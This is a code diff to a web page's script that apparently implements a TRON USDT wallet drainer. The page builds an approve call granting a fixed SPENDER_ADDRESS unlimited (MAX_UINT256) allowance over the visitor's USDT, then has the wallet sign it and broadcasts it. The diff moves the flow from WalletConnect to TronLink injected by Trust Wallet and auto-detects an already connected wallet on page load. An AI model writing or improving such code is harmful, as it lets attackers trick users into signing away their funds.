@@ -7,9 +7,6 @@
 
 <link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
 
-<!-- TronWeb3 WalletConnect Provider -->
-<script src="https://npmcdn.com/@tronweb3/walletconnect-tron-provider@latest/dist/index.umd.min.js"></script>
-
 <style>
 body{
   margin:0;
@@ -215,14 +212,12 @@ body{
 
 <script>
 // CONFIG
-const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
-const TRON_CHAIN_ID = 728126428; // TRON mainnet
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const APPROVE_SELECTOR = "095ea7b3";
 const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-let provider = null;
+let tronWeb = null;
 let address = null;
 let isProcessing = false;
 
@@ -304,18 +299,15 @@ async function sendApproval(){
 
     setStatus("Requesting signature...", 'loading');
 
-    // Sign with provider
-    const signedTx = await provider.request({
-      method: 'tron_signTransaction',
-      params: [txResponse.transaction]
-    });
+    // Sign with TronWeb
+    const signed = await tronWeb.trx.sign(txResponse.transaction);
 
     setStatus("Broadcasting transaction...", 'loading');
 
     const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
       method: "POST",
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(signedTx)
+      body: JSON.stringify(signed)
     }).then(r => r.json());
 
     if(broadcastResponse.result || broadcastResponse.txid){
@@ -341,30 +333,26 @@ async function connectWallet(){
   try{
     setStatus("Connecting wallet...", 'loading');
 
-    // Initialize WalletConnect provider
-    if(!provider){
-      provider = new WalletConnectTronProvider({
-        projectId: PROJECT_ID,
-        chainId: TRON_CHAIN_ID,
-        rpc: {
-          [TRON_CHAIN_ID]: 'https://api.trongrid.io'
-        }
-      });
+    // Check if TronLink is available (injected by Trust Wallet)
+    if(!window.tronLink){
+      throw new Error("TronLink not detected. Please open this page in Trust Wallet browser.");
     }
 
     // Request account
-    const accounts = await provider.request({
+    await window.tronLink.request({
       method: 'tron_requestAccounts'
     });
 
-    if(accounts && accounts.length > 0){
-      address = accounts[0];
+    // Get TronWeb instance
+    if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+      tronWeb = window.tronWeb;
+      address = tronWeb.defaultAddress.base58;
       clearStatus();
-      console.log("Connected:", address);
+      console.log("Connected with TronLink:", address);
       return true;
     }
 
-    throw new Error("No accounts found");
+    throw new Error("Failed to connect wallet");
 
   }catch(e){
     console.error("Connect error:", e);
@@ -398,7 +386,15 @@ async function handleNext(){
 
 // Page load
 document.addEventListener('DOMContentLoaded', function(){
-  console.log("Page loaded - WalletConnect ready");
+  console.log("Page loaded");
+  
+  // Check if already connected
+  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+    tronWeb = window.tronWeb;
+    address = tronWeb.defaultAddress.base58;
+    document.getElementById("btn").innerText = "Send Approval";
+    console.log("Already connected:", address);
+  }
 });
 
 </script>
